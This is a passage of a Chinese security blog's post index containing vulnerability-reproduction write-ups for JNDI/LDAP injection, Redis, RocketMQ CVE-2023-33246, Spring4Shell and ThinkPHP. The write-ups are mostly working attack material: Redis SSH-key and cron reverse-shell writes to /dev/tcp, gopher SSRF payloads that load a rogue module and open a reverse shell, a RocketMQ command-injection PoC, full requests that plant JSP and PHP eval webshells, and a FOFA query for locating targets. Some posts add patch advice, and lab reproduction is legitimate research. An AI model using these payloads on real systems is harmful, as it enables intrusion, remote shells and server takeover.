alt=\"image\"></p>\n<p>5.在Exploit目录中开启http服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python37 -m http.server 8888</span><br></pre></td></tr></table></figure>\n<p>6.再打开一个shell创建一个ldap的服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -<span class=\"built_in\">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class=\"string\">&quot;http://127.0.0.1:8888/#Exploit&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"c88f04a3-152d-4da9-94e0-e773ec035a56.png\" alt=\"image\"></p>\n<p>7.再次运行项目</p>\n<p><img src=\"93cc5804-1b33-460c-8f29-7bd18044c38f.jpg\" alt=\"image\"></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","反序列化","RCE"]},{"title":"Redis安全攻防","url":"/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/","content":"<h1 id=\"Redis安全攻防\"><a href=\"#Redis安全攻防\" class=\"headerlink\" title=\"Redis安全攻防\"></a>Redis安全攻防</h1><p>Redis漏洞复现 </p>\n<h1 id=\"一、redis基本命令\"><a href=\"#一、redis基本命令\" class=\"headerlink\" title=\"一、redis基本命令\"></a>一、redis基本命令</h1><p>连接redis：<code>redis-cli -h 192.168.63.130</code></p>\n<p>查看redis版本信息、一些具体信息、服务器版本信息等等：<code>192.168.63.130:6379&gt;info</code></p>\n<p>将变量x的值设为test：<code>192.168.63.130:6379&gt;set x &quot;test&quot;</code></p>\n<p>获取设置的某个变量的值：<code>192.168.63.130:6379&gt;get x</code></p>\n<p>`flushall`是把整个redis数据库删除，一般情况下不要用！！！<code>192.168.63.130:6379&gt;flushall</code></p>\n<p>查看所有键：<code>192.168.63.130:6379&gt;KEYS *</code></p>\n<p>获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。</p>\n<p><code>192.168.63.130:6379&gt;CONFIG GET dir</code></p>\n<p><code>192.168.63.130:6379&gt;CONFIG GET dbfilename</code></p>\n<h1 id=\"二、redis写入公钥拿shell\"><a href=\"#二、redis写入公钥拿shell\" class=\"headerlink\" title=\"二、redis写入公钥拿shell\"></a>二、redis写入公钥拿shell</h1><p>1.生成密钥公钥</p>\n<p><code>ssh-keygen -t rsa</code></p>\n<p><img src=\"tJ9dBcFvdTBku1jTUhQcDKqxROJLIVenpu7PvqOBpUA.png\" alt=\"image\"></p>\n<p>2.防止乱码 导出key(在&#x2F;root&#x2F;.ssh下执行)</p>\n<p><code>(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txt</code></p>\n<p><img src=\"wN4rN0-J4Yb2LOTeWvuGhMNfQyq5OWe2ayIG4zI4ciQ.png\" alt=\"image\"><br><code>查看密钥 ： cat key.txt </code></p>\n<p><img src=\"CbHaC0VXV9q7Rd4Yxr6MV3bXaaxu5r5SKbErCn8vkys.png\" alt=\"image\"><br><code>查看密钥并且设置：cat key.txt | redis-cli -h 192.168.0.108 --pass pass123 -x set xxx</code></p>\n<p><img src=\"pm6PrjoMOT2GhDwE0iqM7hU-7t-sLSX3r5PgAvrmDJY.png\" alt=\"image\"></p>\n<p><code>redis-cli -h 192.168.1.102</code></p>\n<p><code>192.168.1.102:6379&gt; config set dir /root/.ssh</code></p>\n<p><code>192.168.1.102:6379&gt; config set dbfilename authorized_keys</code></p>\n<p><code>192.168.1.102:6379&gt; save</code></p>\n<p><code>192.168.1.102:6379&gt; exit</code></p>\n<p><img src=\"iM6sagql4-kqrADpZInkmJ6zh4vtofNOYUwDPzfm7_U.png\" alt=\"image\"></p>\n<h1 id=\"三、redis写webshell（拿下webshell）\"><a href=\"#三、redis写webshell（拿下webshell）\" class=\"headerlink\" title=\"三、redis写webshell（拿下webshell）\"></a>三、redis写webshell（拿下webshell）</h1><p>知道网站根路径，或者能猜测</p>\n<p><code>/var/www/wordpress</code></p>\n<p><code>/var/www/html/randomapi</code></p>\n<p><code> </code></p>\n<p><code>config set dir /var/www/wordpress</code></p>\n<p><code>config set dbfilename shell.php</code></p>\n<p><code>set x &quot;&lt;?php phpinfo();?&gt;&quot;</code></p>\n<p><code>save</code></p>\n<p><img src=\"lDqgVfprnZ3D0FTI66AafHin2tcShom-sJbv4WuT_2E.png\" alt=\"image\"></p>\n<p>访问</p>\n<p><img src=\"HUQdX281pGZPxp9vb_wwH6mhHEM8YRu5K4lpVwUFqP8.png\" alt=\"image\"></p>\n<h1 id=\"四、利用计划任务反弹shell（nc反弹shell）\"><a href=\"#四、利用计划任务反弹shell（nc反弹shell）\" class=\"headerlink\" title=\"四、利用计划任务反弹shell（nc反弹shell）\"></a>四、利用计划任务反弹shell（nc反弹shell）</h1><p>1.写入语句到变量x</p>\n<p><code>echo -e &quot;\\n\\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/172.16.16.126/7799 0&gt;&amp;1\\n\\n&quot;|redis-cli -h 192.168.1.102 -x set 1</code></p>\n<p>2.#设置Redis的备份路径</p>\n<p><code>redis-cli -h 192.168.1.102 config set dir /var/spool/cron/  </code></p>\n<p>3.#设置备份文件和文件名</p>\n<p><code>redis-cli -h 192.168.1.102 config set dbfilename root</code></p>\n<p><code>redis-cli -h 192.168.1.102 save</code></p>\n<p><img src=\"qgpu3LTShkNyt4g9iNJ3HT6boMeI7ezlTRBxaSxuams.png\" alt=\"image\"></p>\n<p>Kali监听</p>\n<p><code>nc -lvnp 7799</code></p>\n<p> </p>\n<h1 id=\"五、ssrf-redis-反弹shell\"><a href=\"#五、ssrf-redis-反弹shell\" class=\"headerlink\" title=\"五、ssrf redis 反弹shell\"></a>五、ssrf redis 反弹shell</h1><p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit</code></p>\n<p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520192.168.0.119%252021000%250d%250aquit</code></p>\n<p>导入模块 </p>\n<p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250amodule%2520load%2520./exp.so%250d%250aquit</code></p>\n<p>关闭主从</p>\n<p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aslaveof%2520NO%2520ONE%250d%250aquit</code></p>\n<p>设置数据库名</p>\n<p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dbfilename%2520dump.rdb%250d%250aquit</code></p>\n<p>反弹shell</p>\n<p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250asystem.rev%2520192.168.0.119%25206666%250d%250aquit</code></p>\n<h1 id=\"六、redis安全设置\"><a href=\"#六、redis安全设置\" class=\"headerlink\" title=\"六、redis安全设置\"></a>六、redis安全设置</h1><p>1、单独为redis设置一个普通账号 启动redis</p>\n<p>2、设置本地 localhost 不允许外部访问</p>\n<p>3、保护模式开启 protected-mode 开启 （默认开启）</p>\n<p>4、把端口最好更改</p>\n<p>5、requirepass 设置redis密码 </p>\n","categories":["漏洞复现"],"tags":["漏洞复现","Redis"]},{"title":"RocketMQ远程代码执行（CVE-2023-33246）","url":"/2023/05/31/RocketMQ%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2023-33246%EF%BC%89/","content":"<h1 id=\"RocketMQ远程代码执行（CVE-2023-33246）\"><a href=\"#RocketMQ远程代码执行（CVE-2023-33246）\" class=\"headerlink\" title=\"RocketMQ远程代码执行（CVE-2023-33246）\"></a>RocketMQ远程代码执行（CVE-2023-33246）</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>RocketMQ的NameServer、Broker、Controller等多个组件暴露在外网且缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行命令。</p>\n<p>详情：<a href=\"https://mp.weixin.qq.com/s/FZ3NyR8YnqWHn1pv_Dmtyg\">https://mp.weixin.qq.com/s/FZ3NyR8YnqWHn1pv_Dmtyg</a></p>\n<h2 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Apache RocketMQ &lt;= 5.1.0</span><br><span class=\"line\">Apache RocketMQ &lt;= 4.9.5</span><br></pre></td></tr></table></figure>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>下载镜像</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull apache/rocketmq:4.9.1</span><br><span class=\"line\">docker pull apacherocketmq/rocketmq-console:2.0.0</span><br></pre></td></tr></table></figure>\n<p><img src=\"5EUxTxBsHGUK3F-n-lrwoGeMAsaRGwDv6P4Ar3_4wlo.png\" alt=\"image\"></p>\n<p>启动namesrv</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d -p 9876:9876 -v /data/namesrv/logs:/root/logs -v /data/namesrv/store:/root/store --name rmqnamesrv -e <span class=\"string\">&quot;MAX_POSSIBLE_HEAP=100000000&quot;</span> apache/rocketmq:4.9.1 sh mqnamesrv</span><br></pre></td></tr></table></figure>\n<p>创建目录</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> -p /mydata/rocketmq/conf/</span><br></pre></td></tr></table></figure>\n<p>在宿主机创建broker配置文件, 启动broker服务需要，我这里的路径为: &#x2F;mydata&#x2F;rocketmq&#x2F;conf&#x2F;broker.conf</p>\n<p>文件内容(vim &#x2F;mydata&#x2F;rocketmq&#x2F;conf&#x2F;broker.conf)</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">brokerClusterName = DefaultCluster </span><br><span class=\"line\">brokerName = broker-a </span><br><span class=\"line\">brokerId = 0 </span><br><span class=\"line\">deleteWhen = 04 </span><br><span class=\"line\">fileReservedTime = 48 </span><br><span class=\"line\">brokerRole = ASYNC_MASTER </span><br><span class=\"line\">flushDiskType = SYNC_FLUSH </span><br><span class=\"line\">brokerIP1 = 192.168.88.104</span><br></pre></td></tr></table></figure>\n<p>注：192.168.88.104为我的宿主机IP</p>\n<p>启动broker</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d -p 10911:10911 -p 10909:10909 -v  /data/broker/logs:/root/logs -v  /data/broker/store:/root/store -v  /mydata/rocketmq/conf/broker.conf:/opt/rocketmq/conf/broker.conf --name rmqbroker --<span class=\"built_in\">link</span> rmqnamesrv:namesrv -e <span class=\"string\">&quot;NAMESRV_ADDR=namesrv:9876&quot;</span> -e <span class=\"string\">&quot;MAX_POSSIBLE_HEAP=200000000&quot;</span> apache/rocketmq:4.9.1 sh mqbroker -c /opt/rocketmq/conf/broker.conf</span><br></pre></td></tr></table></figure>\n<p><img src=\"4PIm955_uXgP9ZCJeScdo5B-fUdoETQQrLFWqONHFrQ.png\" alt=\"image\"></p>\n<p>启动console</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d --name rmqconsole -p 8899:8080 --<span class=\"built_in\">link</span> rmqnamesrv:namesrv\\</span><br><span class=\"line\"> -e <span class=\"string\">&quot;JAVA_OPTS=-Drocketmq.namesrv.addr=192.168.88.104:9876\\</span></span><br><span class=\"line\"><span class=\"string\"> -Dcom.rocketmq.sendMessageWithVIPChannel=false&quot;</span>\\</span><br><span class=\"line\"> -t apacherocketmq/rocketmq-console:2.0.0</span><br></pre></td></tr></table></figure>\n<p><img src=\"slTQhQM-blEAFCgGObHC00wlKuMhwtVGW8RoQ_zjPfg.png\" alt=\"image\"></p>\n<p>访问<a href=\"http://192.168.88.104:8899/\">http://192.168.88.104:8899</a></p>\n<p><img src=\"VsvlA70VtS2rNsyjqeprR2b6RjpDc9RsLxqau9Mjggs.png\" alt=\"image\"></p>\n<h2 id=\"POC攻击\"><a href=\"#POC攻击\" class=\"headerlink\" title=\"POC攻击\"></a>POC攻击</h2><p>下载地址：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://github.com/I5N0rth/CVE-2023-33246</span><br></pre></td></tr></table></figure>\n<p>mqrce.java</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">package org.example;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.Properties;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Created by IntelliJ IDEA.</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @Author: Garck3h</span><br><span class=\"line\"> * @Date: 2023/5/31</span><br><span class=\"line\"> * @Time: 20:22</span><br><span class=\"line\"> * Life is endless, and there is no end to it.</span><br><span class=\"line\"> **/</span><br><span class=\"line\">public class mqrce &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws Exception &#123;</span><br><span class=\"line\">        String[] urls = &#123;<span class=\"string\">&quot;192.168.88.104:8899&quot;</span>&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (int i = 0; i &lt; urls.length; i++) &#123;</span><br><span class=\"line\">            updateConfig(urls[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void updateConfig(String url) throws Exception &#123;</span><br><span class=\"line\">        Properties props = new Properties();</span><br><span class=\"line\">        props.setProperty(<span class=\"string\">&quot;rocketmqHome&quot;</span>,<span class=\"string\">&quot;-c <span class=\"variable\">$@</span>|sh . echo  curl 192.168.1.7:8877&quot;</span>);</span><br><span class=\"line\">        props.setProperty(<span class=\"string\">&quot;filterServerNums&quot;</span>,<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">        // 创建 DefaultMQAdminExt 对象并启动</span><br><span class=\"line\">        DefaultMQAdminExt admin = new DefaultMQAdminExt();</span><br><span class=\"line\">        admin.setNamesrvAddr(<span class=\"string\">&quot;192.168.88.104:9876&quot;</span>);</span><br><span class=\"line\">        admin.start();</span><br><span class=\"line\">        // 更新配置⽂件</span><br><span class=\"line\">        admin.updateBrokerConfig(url, props);</span><br><span class=\"line\">        Properties brokerConfig = admin.getBrokerConfig(url);</span><br><span class=\"line\">        System.out.println(brokerConfig.getProperty(<span class=\"string\">&quot;rocketmqHome&quot;</span>));</span><br><span class=\"line\">        System.out.println(brokerConfig.getProperty(<span class=\"string\">&quot;filterServerNums&quot;</span>));</span><br><span class=\"line\">        // 关闭 DefaultMQAdminExt 对象</span><br><span class=\"line\">        admin.shutdown();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>maven配置文件pom.xml</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;project xmlns=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class=\"line\">         xmlns:xsi=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class=\"line\">         xsi:schemaLocation=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class=\"line\">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;test1&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;properties&gt;</span><br><span class=\"line\">        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class=\"line\">        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class=\"line\">        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class=\"line\">    &lt;/properties&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;dependencies&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.apache.rocketmq&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;rocketmq-tools&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;4.9.1&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">    &lt;/dependencies&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/project&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"MK4WGFxDQXHugRRfxNRo6UnUE6-EZAuUoO_nlAo4V7g.png\" alt=\"image\"></p>\n<h2 id=\"修复建议\"><a href=\"#修复建议\" class=\"headerlink\" title=\"修复建议\"></a>修复建议</h2><p>目前官方已发布安全修复更新，受影响用户可以升级到Apache RocketMQ 5.1.1或者4.9.6</p>\n<p><a href=\"https://rocketmq.apache.org/download/\">https://rocketmq.apache.org/download/</a></p>\n","categories":["漏洞复现"],"tags":["中间件","rce"]},{"title":"Spring Framework RCE简单复现(CVE-2022-22965)","url":"/2022/12/13/Spring%20Framework%20RCE%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0(CVE-2022-22965)/","content":"<h1 id=\"Spring-Framework-RCE简单复现-CVE-2022-22965\"><a href=\"#Spring-Framework-RCE简单复现-CVE-2022-22965\" class=\"headerlink\" title=\"Spring Framework RCE简单复现(CVE-2022-22965)\"></a>Spring Framework RCE简单复现(CVE-2022-22965)</h1><h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>下载地址：<a href=\"https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965\">https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965</a></p>\n<p>拉取镜像：docker pull vulhub&#x2F;spring-webmvc:5.3.17</p>\n<p>启动：docker run -p 18080:8080 -d vulhub&#x2F;spring-webmvc:5.3.17</p>\n<h2 id=\"访问页面\"><a href=\"#访问页面\" class=\"headerlink\" title=\"访问页面\"></a>访问页面</h2><p><img src=\"_0u-bhgGTqNAQMEEMZ4N7mYm-Dgsj9NOda_M8vJDkOo.png\" alt=\"image\"></p>\n<p>在bp访问的效果</p>\n<p><img src=\"VAQtdv4hG1iEp-P6k023WAqYL7f8SZMtby5b9fK1-4g.png\" alt=\"image\"></p>\n<h2 id=\"payload1攻击\"><a href=\"#payload1攻击\" class=\"headerlink\" title=\"payload1攻击\"></a>payload1攻击</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET /?<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.pattern=%<span class=\"number\">25</span>%7Bc2%7Di%<span class=\"number\">20</span><span class=\"keyword\">if</span>(%<span class=\"number\">22j</span>%<span class=\"number\">22.</span>equals(request.getParameter(%22pwd%<span class=\"number\">22</span>)))%7B%20java.io.InputStream%<span class=\"number\">20</span><span class=\"keyword\">in</span>%<span class=\"number\">20</span>%3D%<span class=\"number\">20</span>%<span class=\"number\">25</span>%7Bc1%7Di.getRuntime().<span class=\"built_in\">exec</span>(request.getParameter(%22cmd%<span class=\"number\">22</span>)).getInputStream()%3B%<span class=\"number\">20</span><span class=\"built_in\">int</span>%20a%<span class=\"number\">20</span>%3D%<span class=\"number\">20</span>-<span class=\"number\">1</span>%3B%20byte%5B%5D%20b%<span class=\"number\">20</span>%3D%20new%20byte%5B2048%5D%3B%<span class=\"number\">20</span><span class=\"keyword\">while</span>((a%3Din.read(b))!%3D-<span class=\"number\">1</span>)%7B%20out.println(new%20String(b))%3B%<span class=\"number\">20</span>%7D%<span class=\"number\">20</span>%7D%<span class=\"number\">20</span>%<span class=\"number\">25</span>%7Bsuffix%7Di&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.104</span>:<span class=\"number\">18080</span></span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">5.0</span> (Windows NT <span class=\"number\">10.0</span>; Win64; x64; rv:<span class=\"number\">107.0</span>) Gecko/<span class=\"number\">20100101</span> Firefox/<span class=\"number\">107.0</span></span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=<span class=\"number\">0.9</span>,image/avif,image/webp,*/*;q=<span class=\"number\">0.8</span></span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=<span class=\"number\">0.8</span>,zh-TW;q=<span class=\"number\">0.7</span>,zh-HK;q=<span class=\"number\">0.5</span>,en-US;q=<span class=\"number\">0.3</span>,en;q=<span class=\"number\">0.2</span></span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">suffix: %&gt;//</span><br><span class=\"line\">c1: Runtime</span><br><span class=\"line\">c2: &lt;%</span><br><span class=\"line\">DNT: <span class=\"number\">1</span></span><br><span class=\"line\">Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqWXhaVFEyWldRM0xURmxOelV0TkRjek15MWhPRE0wTFRneVltUmpaREF3T1RZME1pST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--647e08d3a6c45cf8c02e7a542cc7a85b8006566a; JSESSIONID=7A7EBF053C4EB86DCEC2FE868DFBE92E</span><br><span class=\"line\">Upgrade-Insecure-Requests: <span class=\"number\">1</span></span><br><span class=\"line\">Cache-Control: <span class=\"built_in\">max</span>-age=<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"VAQtdv4hG1iEp-P6k023WAqYL7f8SZMtby5b9fK1-4g.png\" alt=\"image\"></p>\n<p>踩坑1：每次写完shell会有缓存，如果发现没重复打payload没写成，就重启一下tomcat服务就好了。</p>\n<p>踩坑2：下面的请求头，一定要夹在里面，不然不会请求到里面，写的马就会不对</p>\n<h2 id=\"payload2攻击\"><a href=\"#payload2攻击\" class=\"headerlink\" title=\"payload2攻击\"></a>payload2攻击</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.pattern=%<span class=\"number\">25</span>%7Bc2%7Di%<span class=\"number\">20</span><span class=\"keyword\">if</span>(%<span class=\"number\">22j</span>%<span class=\"number\">22.</span>equals(request.getParameter(%22pwd%<span class=\"number\">22</span>)))%7B%20java.io.InputStream%<span class=\"number\">20</span><span class=\"keyword\">in</span>%<span class=\"number\">20</span>%3D%<span class=\"number\">20</span>%<span class=\"number\">25</span>%7Bc1%7Di.getRuntime().<span class=\"built_in\">exec</span>(request.getParameter(%22cmd%<span class=\"number\">22</span>)).getInputStream()%3B%<span class=\"number\">20</span><span class=\"built_in\">int</span>%20a%<span class=\"number\">20</span>%3D%<span class=\"number\">20</span>-<span class=\"number\">1</span>%3B%20byte%5B%5D%20b%<span class=\"number\">20</span>%3D%20new%20byte%5B2048%5D%3B%<span class=\"number\">20</span><span class=\"keyword\">while</span>((a%3Din.read(b))!%3D-<span class=\"number\">1</span>)%7B%20out.println(new%20String(b))%3B%<span class=\"number\">20</span>%7D%<span class=\"number\">20</span>%7D%<span class=\"number\">20</span>%<span class=\"number\">25</span>%7Bsuffix%7Di&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;<span class=\"keyword\">class</span>.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">suffix: %&gt;//</span><br><span class=\"line\">c1: Runtime</span><br><span class=\"line\">c2: &lt;%</span><br><span class=\"line\">DNT: <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>最后访问执行webshell</p>\n<p><a href=\"http://192.168.88.104:18080//tomcatwar.jsp?pwd=j&cmd=id\">http://192.168.88.104:18080//tomcatwar.jsp?pwd=j&cmd=id</a></p>\n<p><img src=\"L5HwLHbvz6dYQ1dfF73f89a_LY2KEkBuqhWYjHM54uY.png\" alt=\"image\"></p>\n<p><a href=\"http://192.168.88.104:18080//tomcatwar.jsp?pwd=j&cmd=whoami\">http://192.168.88.104:18080//tomcatwar.jsp?pwd=j&cmd=whoami</a></p>\n<p><img src=\"L00mTlxmRzkR3nOEU0MV8zmatTJwTUtqZjxXOHq70mM.png\" alt=\"image\"></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","RCE","Spring"]},{"title":"ThinkPHP 多语言RCE","url":"/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/","content":"<h1 id=\"Think-PHP-多语言RCE\"><a href=\"#Think-PHP-多语言RCE\" class=\"headerlink\" title=\"Think PHP 多语言RCE\"></a>Think PHP 多语言RCE</h1><h2 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h2><p>本次漏洞影响范围如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">v6.0.1 &lt; Thinkphp &lt; v6.0.13 </span><br><span class=\"line\">Thinkphp v5.0.x </span><br><span class=\"line\">Thinkphp v5.1.x</span><br></pre></td></tr></table></figure>\n\n\n<p>FOFA 语法：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">header=<span class=\"string\">&quot;think_lang&quot;</span></span><br></pre></td></tr></table></figure>\n<p>要求：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">1、需要Thinkphp开启多语言功能</span><br><span class=\"line\">2、需要有pearcmd扩展</span><br></pre></td></tr></table></figure>\n<p>复现环境：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -it -d -p 8080:80  vulfocus/thinkphp:6.0.12</span><br><span class=\"line\">访问8080</span><br></pre></td></tr></table></figure>\n<h2 id=\"getshell\"><a href=\"#getshell\" class=\"headerlink\" title=\"getshell\"></a>getshell</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET /<span class=\"keyword\">public</span>/index.php?+config-create+/&lt;?=<span class=\"meta\">@eval($_REQUEST[&#x27;w&#x27;])</span>;?&gt;+/tmp/nihao2.php HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">192.168</span><span class=\"number\">.134</span><span class=\"number\">.154</span>:<span class=\"number\">8066</span></span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">9.0</span> (Macintosh; M2 Mac OS X <span class=\"number\">16.12</span>; rv:<span class=\"number\">129.0</span>) Gecko/<span class=\"number\">20230101</span> Firefox/<span class=\"number\">169.0</span></span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=<span class=\"number\">0.9</span>,image/avif,image/webp,*<span class=\"comment\">/*;q=0.8</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">think-lang:../../../../../../../../usr/local/lib/php/pearcmd</span></span><br><span class=\"line\"><span class=\"comment\">Connection: keep-alive</span></span><br><span class=\"line\"><span class=\"comment\">Cookie: think_lang=zh-cn</span></span><br><span class=\"line\"><span class=\"comment\">Upgrade-Insecure-Requests: 1</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br></pre></td></tr></table></figure>\n<p><img src=\"NCwfWVvRgWz82eLRr8l1N7EHtG7Khg_2feCTjwY4uOY.png\" alt=\"image\"></p>\n<h2 id=\"phpinfo\"><a href=\"#phpinfo\" class=\"headerlink\" title=\"phpinfo\"></a>phpinfo</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /<span class=\"keyword\">public</span>/index.php HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">192.168</span><span class=\"number\">.134</span><span class=\"number\">.154</span>:<span class=\"number\">8066</span></span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">9.0</span> (Macintosh; M2 Mac OS X <span 